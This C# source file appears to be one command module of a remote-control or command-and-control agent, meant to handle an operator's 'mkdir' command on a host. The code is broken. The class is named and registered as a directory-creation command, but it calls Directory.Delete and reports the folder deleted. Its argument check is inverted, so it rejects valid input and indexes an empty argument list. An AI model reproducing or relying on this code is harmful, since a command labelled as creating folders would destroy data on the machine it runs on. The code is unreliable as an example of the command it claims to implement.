using Agent.Models;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Agent.Commands
{
    public class MakeDirectoryCommand : AgentCommand
    {
        public override string Name => "mkdir";
        public override void InnerExecute(AgentTask task, Models.Agent agent, AgentTaskResult result, CommModule commm)
        {
            string path;
            if (task.SplittedArgs.Length != 0)
            {
                result.Result = $"Usage : {this.Name} folder_to_create";
                return;
            }
                
            path = task.SplittedArgs[0];

            Directory.Delete(path);
            if (!Directory.Exists(path))
            {
                result.Result = $"{path} deleted";
                return;
            }

            result.Result = $"Failed to delete {path}";
        }
    }
}
